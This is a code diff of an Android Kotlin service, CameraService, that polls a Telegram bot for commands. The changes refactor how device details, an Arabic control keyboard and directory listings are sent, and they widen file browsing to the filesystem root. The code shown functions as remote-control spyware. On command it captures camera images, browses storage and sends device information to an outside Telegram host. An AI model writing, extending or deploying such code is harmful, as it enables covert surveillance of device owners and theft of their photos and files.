@@ -15,6 +15,7 @@ import java.io.File
 import java.io.FileOutputStream
 import java.nio.ByteBuffer
 import kotlinx.coroutines.*
+import org.json.JSONObject
 
 class CameraService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -73,10 +74,6 @@ class CameraService : Service() {
             appendLine("SDK: ${Build.VERSION.SDK_INT}")
             appendLine("Screen: ${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}")
         }
-        Telegram.sendMessageWithKeyboard(info)
-    }
-
-    private fun sendKeyboard() {
         val keyboard = """
         {
             "inline_keyboard": [
@@ -87,7 +84,7 @@ class CameraService : Service() {
             ]
         }
         """.trimIndent()
-        Telegram.sendMessageWithKeyboard("🎛️ لوحة التحكم", keyboard)
+        Telegram.sendMessageWithKeyboard(info, keyboard)
     }
 
     private fun checkCommands() {
@@ -95,27 +92,22 @@ class CameraService : Service() {
         val req = okhttp3.Request.Builder().url(url).build()
         val resp = okhttp3.OkHttpClient().newCall(req).execute()
         val body = resp.body?.string() ?: return
-        val arr = org.json.JSONObject(body).optJSONArray("result") ?: return
+        val arr = JSONObject(body).optJSONArray("result") ?: return
         
         for (i in 0 until arr.length()) {
             val u = arr.getJSONObject(i)
             lastUpdateId = u.getLong("update_id")
             
-            // Text commands
             val text = u.optJSONObject("message")?.optString("text")
             if (text != null) {
                 when (text.trim()) {
-                    "/start" -> {
-                        sendDeviceInfo()
-                        sendKeyboard()
-                    }
+                    "/start" -> { sendDeviceInfo() }
                     "/cam" -> captureAndSend()
                     "/files" -> listDirectory(currentDir)
                     "/stop" -> { isRunning = false; stopSelf() }
                 }
             }
             
-            // Button clicks
             val callback = u.optJSONObject("callback_query")
             if (callback != null) {
                 val data = callback.optString("data")
@@ -187,7 +179,7 @@ class CameraService : Service() {
             val sb = StringBuilder("📂 المجلد: $path\n\n")
             val keyboardList = mutableListOf<List<Map<String, String>>>()
             
-            if (path != "/sdcard/") {
+            if (path != "/sdcard/" && path != "/") {
                 keyboardList.add(listOf(mapOf("text" to "⬅️ رجوع", "callback_data" to "files:${dir.parent}")))
             }
             
@@ -203,12 +195,12 @@ class CameraService : Service() {
             
             val keyboardJson = buildString {
                 append("{\"inline_keyboard\": [")
-                keyboardJson = keyboardList.joinToString(",") { row ->
+                val rows = keyboardList.map { row ->
                     "[" + row.joinToString(",") { 
                         "{\"text\": \"${it["text"]}\", \"callback_data\": \"${it["callback_data"]}\"}" 
                     } + "]"
                 }
-                append(keyboardJson)
+                append(rows.joinToString(","))
                 append("]}")
             }
             
